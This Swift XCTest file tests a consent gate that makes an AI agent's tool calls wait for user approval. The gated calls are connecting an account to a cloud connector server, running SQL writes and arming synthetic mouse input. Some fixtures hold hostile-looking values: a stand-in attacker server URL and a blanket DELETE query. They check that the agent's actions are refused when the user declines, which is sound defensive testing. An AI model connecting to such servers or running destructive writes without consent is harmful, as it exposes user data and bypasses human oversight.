import GRDB
import XCTest

@testable import Omi_Computer

final class AgentToolConsentGateTests: XCTestCase {
  private var originalAuthOwner: String?
  private var originalOwnerOverride: String?
  private var originalOwnerBackup: String?

  override func setUp() async throws {
    try await super.setUp()
    originalAuthOwner = UserDefaults.standard.string(forKey: .authUserId)
    originalOwnerOverride = UserDefaults.standard.string(forKey: .automationOwnerOverride)
    originalOwnerBackup = UserDefaults.standard.string(forKey: .automationOwnerABackup)
  }

  override func tearDown() async throws {
    await MainActor.run { AgentToolConsentGate.setPresenterForTesting(nil) }
    await restoreOriginalOwnerDefaults()
    try await super.tearDown()
  }

  // MARK: - fill_cloud_connector_form

  @MainActor
  func testCloudConnectorFormIsRefusedWithoutUserApproval() async {
    await Self.establishStandardOwner("consent-owner")
    let log = AgentToolConsentLog()
    AgentToolConsentGate.setPresenterForTesting(
      AgentToolConsentGate.recordedRequestsPresenter(.denied, into: log))

    let result = await ChatToolExecutor.execute(
      ToolCall(
        name: "fill_cloud_connector_form",
        arguments: [
          "provider": "claude",
          "server_url": "https://mcp.attacker.example/omi",
          "submit": true,
        ],
        thoughtSignature: nil),
      expectedOwnerID: "consent-owner")

    XCTAssertEqual(result, AgentToolConsentPolicy.cloudConnectorDeclinedResult)
    XCTAssertEqual(log.requests.count, 1)
    XCTAssertEqual(log.requests.first?.toolName, "fill_cloud_connector_form")
    XCTAssertTrue(
      log.requests.first?.message.contains("https://mcp.attacker.example/omi") == true,
      "the prompt must show the server the model chose")
  }

  @MainActor
  func testCloudConnectorFormProceedsAfterUserApproval() async {
    await Self.establishStandardOwner("consent-owner")
    let log = AgentToolConsentLog()
    AgentToolConsentGate.setPresenterForTesting(
      AgentToolConsentGate.recordedRequestsPresenter(.approved, into: log))

    // No `server_url`: the tool's own validation answers, which proves the gate
    // handed execution through instead of refusing it.
    let result = await ChatToolExecutor.execute(
      ToolCall(
        name: "fill_cloud_connector_form",
        arguments: ["provider": "claude", "submit": true],
        thoughtSignature: nil),
      expectedOwnerID: "consent-owner")

    XCTAssertEqual(result, "Error: server_url is required.")
    XCTAssertEqual(log.requests.count, 1)
  }

  @MainActor
  func testCloudConnectorPromptNamesTheSignedInProvider() {
    let request = AgentToolConsentPolicy.cloudConnectorRequest(
      arguments: ["provider": "chatgpt", "server_url": "https://example.test/mcp", "submit": true])
    XCTAssertEqual(request.title, "Connect your ChatGPT account to an external server?")
    XCTAssertEqual(request.approveButtonTitle, "Connect")
    XCTAssertEqual(request.denyButtonTitle, "Don't Connect")
  }

  // MARK: - execute_sql

  @MainActor
  func testExecuteSQLWriteIsRefusedWithoutUserApproval() async throws {
    let pool = try Self.makeProbeDatabase()
    let log = AgentToolConsentLog()
    AgentToolConsentGate.setPresenterForTesting(
      AgentToolConsentGate.recordedRequestsPresenter(.denied, into: log))

    let result = await ChatToolExecutor.executeSQL(
      ["query": "DELETE FROM probe WHERE 1=1"],
      dbQueue: pool,
      expectedOwnerID: nil)

    XCTAssertEqual(result, AgentToolConsentPolicy.sqlWriteDeclinedResult)
    XCTAssertEqual(log.requests.count, 1)
    XCTAssertEqual(log.requests.first?.toolName, "execute_sql")
    let remaining = try await pool.read { db in
      try Int.fetchOne(db, sql: "SELECT COUNT(*) FROM probe") ?? -1
    }
    XCTAssertEqual(remaining, 1, "a declined write must not reach the database")
  }

  @MainActor
  func testExecuteSQLWriteProceedsAfterUserApproval() async throws {
    let pool = try Self.makeProbeDatabase()
    AgentToolConsentGate.setPresenterForTesting { _ in .approved }

    let result = await ChatToolExecutor.executeSQL(
      ["query": "DELETE FROM probe WHERE 1=1"],
      dbQueue: pool,
      expectedOwnerID: nil)

    XCTAssertEqual(result, "OK: 1 row(s) affected")
    let remaining = try await pool.read { db in
      try Int.fetchOne(db, sql: "SELECT COUNT(*) FROM probe") ?? -1
    }
    XCTAssertEqual(remaining, 0)
  }

  @MainActor
  func testExecuteSQLReadDoesNotPromptTheUser() async throws {
    let pool = try Self.makeProbeDatabase()
    let log = AgentToolConsentLog()
    AgentToolConsentGate.setPresenterForTesting(
      AgentToolConsentGate.recordedRequestsPresenter(.denied, into: log))

    let result = await ChatToolExecutor.executeSQL(
      ["query": "SELECT value FROM probe"],
      dbQueue: pool,
      expectedOwnerID: nil)

    XCTAssertTrue(result.contains("kept"))
    XCTAssertTrue(log.requests.isEmpty, "reads must stay prompt-free")
  }

  // MARK: - point_click

  @MainActor
  func testSyntheticInputStaysDisarmedWhenTheUserDeclines() {
    let session = NSObject()
    var state = SyntheticInputArmingState()
    var prompts = 0

    let armed = state.armIfUserConfirms(
      sessionKey: ObjectIdentifier(session),
      confirm: {
        prompts += 1
        return false
      })

    XCTAssertFalse(armed)
    XCTAssertEqual(prompts, 1)
    XCTAssertFalse(state.isArmed(forSessionKey: ObjectIdentifier(session)))
  }

  @MainActor
  func testSyntheticInputArmsOncePerSessionAndResetsWithIt() {
    let sessionA = NSObject()
    let sessionB = NSObject()
    var state = SyntheticInputArmingState()
    var prompts = 0
    let confirm = {
      prompts += 1
      return true
    }

    XCTAssertTrue(state.armIfUserConfirms(sessionKey: ObjectIdentifier(sessionA), confirm: confirm))
    XCTAssertTrue(state.armIfUserConfirms(sessionKey: ObjectIdentifier(sessionA), confirm: confirm))
    XCTAssertEqual(prompts, 1, "one opt-in covers the whole session")

    XCTAssertFalse(state.isArmed(forSessionKey: ObjectIdentifier(sessionB)))
    XCTAssertTrue(state.armIfUserConfirms(sessionKey: ObjectIdentifier(sessionB), confirm: confirm))
    XCTAssertEqual(prompts, 2, "a new session must ask again")

    state.disarm()
    XCTAssertFalse(state.isArmed(forSessionKey: ObjectIdentifier(sessionB)))
  }

  @MainActor
  func testSyntheticInputCannotArmWithoutASession() {
    var state = SyntheticInputArmingState()
    XCTAssertFalse(state.armIfUserConfirms(sessionKey: nil, confirm: { true }))
    XCTAssertFalse(state.isArmed(forSessionKey: nil))
  }

  @MainActor
  func testRealtimeHubRefusesSyntheticInputWithNoLiveSession() {
    AgentToolConsentGate.setPresenterForTesting { _ in .approved }
    RealtimeHubController.shared.syntheticInputArming.disarm()
    XCTAssertNil(RealtimeHubController.shared.syntheticInputSessionKey)
    XCTAssertFalse(RealtimeHubController.shared.ensureSyntheticInputArmed())
  }

  // MARK: - Helpers

  private static func makeProbeDatabase() throws -> DatabasePool {
    let directory = FileManager.default.temporaryDirectory
      .appendingPathComponent("consent-gate-\(UUID().uuidString)", isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    let pool = try DatabasePool(path: directory.appendingPathComponent("test.sqlite").path)
    try pool.write { db in
      try db.execute(sql: "CREATE TABLE probe (value TEXT NOT NULL)")
      try db.execute(sql: "INSERT INTO probe (value) VALUES ('kept')")
    }
    return pool
  }

  private static func establishStandardOwner(_ ownerID: String?) async {
    let bootstrapOwner = "agent-tool-consent-bootstrap"
    await Self.transitionStandardOwner(to: ownerID == bootstrapOwner ? nil : bootstrapOwner)
    await Self.transitionStandardOwner(to: ownerID)
  }

  private static func transitionStandardOwner(to ownerID: String?) async {
    do {
      try await RuntimeOwnerIdentity.performEffectiveOwnerTransition(
        defaults: .standard,
        allowAutomationOverride: false,
        plannedNextOwner: { _, _ in ownerID },
        quiesceVoice: { _, _ in },
        revokeKernelOwner: { _, _ in },
        retargetLocalStorage: { _, _ in },
        ownerDidChange: {}
      ) { defaults in
        defaults.removeObject(forKey: .automationOwnerOverride)
        defaults.removeObject(forKey: .automationOwnerABackup)
        if let ownerID {
          defaults.set(ownerID, forKey: .authUserId)
        } else {
          defaults.removeObject(forKey: .authUserId)
        }
      }
    } catch {
      XCTFail("owner transition failed: \(error)")
    }
  }

  private func restoreOriginalOwnerDefaults() async {
    let authOwner = originalAuthOwner
    let ownerOverride = originalOwnerOverride
    let ownerBackup = originalOwnerBackup
    let effectiveOwner =
      ownerOverride?.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty == false
      ? ownerOverride
      : authOwner
    await Self.transitionStandardOwner(to: "agent-tool-consent-restore")
    do {
      try await RuntimeOwnerIdentity.performEffectiveOwnerTransition(
        defaults: .standard,
        allowAutomationOverride: true,
        plannedNextOwner: { _, _ in effectiveOwner },
        quiesceVoice: { _, _ in },
        revokeKernelOwner: { _, _ in },
        retargetLocalStorage: { _, _ in },
        ownerDidChange: {}
      ) { defaults in
        for (key, value) in [
          (DefaultsKey.authUserId, authOwner),
          (DefaultsKey.automationOwnerOverride, ownerOverride),
          (DefaultsKey.automationOwnerABackup, ownerBackup),
        ] {
          if let value {
            defaults.set(value, forKey: key)
          } else {
            defaults.removeObject(forKey: key)
          }
        }
      }
    } catch {
      XCTFail("owner restore failed: \(error)")
    }
  }
}
